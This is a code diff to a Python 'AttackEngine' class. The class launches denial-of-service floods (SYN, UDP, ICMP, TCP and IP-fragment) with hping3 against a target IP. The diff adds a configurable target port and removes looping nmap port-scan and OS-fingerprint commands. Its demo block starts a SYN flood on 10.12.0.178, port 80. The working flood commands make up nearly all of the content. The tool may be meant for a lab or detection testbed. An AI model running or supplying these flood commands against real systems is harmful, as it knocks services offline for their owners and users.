@@ -25,7 +25,7 @@ class AttackEngine:
         self.attack_config: Optional[Dict[str, Any]] = None
     
     async def start_attack(self, attack_type: str, target_ip: str, interface: str = "eth0", 
-                          duration: int = 60) -> bool:
+                          duration: int = 60, port: int = 55443) -> bool:
         """
         Start an attack with specified parameters.
         
@@ -34,14 +34,15 @@ class AttackEngine:
             target_ip: Target IP address
             interface: Network interface to use
             duration: Attack duration in seconds
+            port: Target port for the attack (default: 55443)
             
         Returns:
             bool: True if attack started successfully, False otherwise
         """
-        logger.info(f"Starting {attack_type} attack on {target_ip} for {duration} seconds")
+        logger.info(f"Starting {attack_type} attack on {target_ip}:{port} for {duration} seconds")
         
         try:
-            command = self._build_attack_command(attack_type, target_ip, interface)
+            command = self._build_attack_command(attack_type, target_ip, interface, port)
             
             if not command:
                 logger.error(f"Unknown attack type: {attack_type}")
@@ -64,7 +65,8 @@ class AttackEngine:
                     'type': attack_type,
                     'target': target_ip,
                     'interface': interface,
-                    'duration': duration
+                    'duration': duration,
+                    'port': port
                 }
                 logger.info(f"Attack started successfully (PID: {self.attack_process.pid})")
                 
@@ -80,36 +82,28 @@ class AttackEngine:
             logger.error(f"Failed to start attack: {e}")
             return False
     
-    def _build_attack_command(self, attack_type: str, target_ip: str, interface: str) -> Optional[list]:
+    def _build_attack_command(self, attack_type: str, target_ip: str, interface: str, port: int) -> Optional[list]:
         """Build the command list for the specified attack type"""
         
         attack_commands = {
             'syn_flood': [
                 'hping3', '-S', '-I', interface, 
-                '-p', '55443', '-i', 'u1000', '--flood', target_ip
+                '-p', str(port), '-i', 'u1000', '--flood', target_ip
             ],
             'udp_flood': [
                 'hping3', '--udp', '-I', interface,
-                '-p', '55443', '-i', 'u1000', '--flood', target_ip
+                '-p', str(port), '-i', 'u1000', '--flood', target_ip
             ],
             'icmp_flood': [
                 'hping3', '--icmp', '--flood', target_ip
             ],
             'tcp_flood': [
                 'hping3', '-A', '-I', interface,
-                '-p', '55443', '-i', 'u1000', '--flood', target_ip
+                '-p', str(port), '-i', 'u1000', '--flood', target_ip
             ],
             'ip_frag_flood': [
                 'hping3', '-f', '-I', interface,
-                '-p', '55443', '--flood', target_ip
-            ],
-            'port_scan': [
-                'bash', '-c', 
-                f'while true; do nmap -sS -p- {target_ip}; sleep 1; done'
-            ],
-            'os_fingerprint': [
-                'timeout', '60s', 'bash', '-c',
-                f'while true; do nmap -O --osscan-guess -p- {target_ip}; done'
+                '-p', str(port), '--flood', target_ip
             ]
         }
         
@@ -228,7 +222,7 @@ if __name__ == '__main__':
             
             # Start attack (will auto-stop after 5 seconds)
             print("Starting attack (will run for 5 seconds)...")
-            success = await engine.start_attack('syn_flood', '10.12.0.178', 'eth0', 5)
+            success = await engine.start_attack('syn_flood', '10.12.0.178', 'eth0', 5, 80)
             print(f"Attack started: {success}")
             
             # Check status
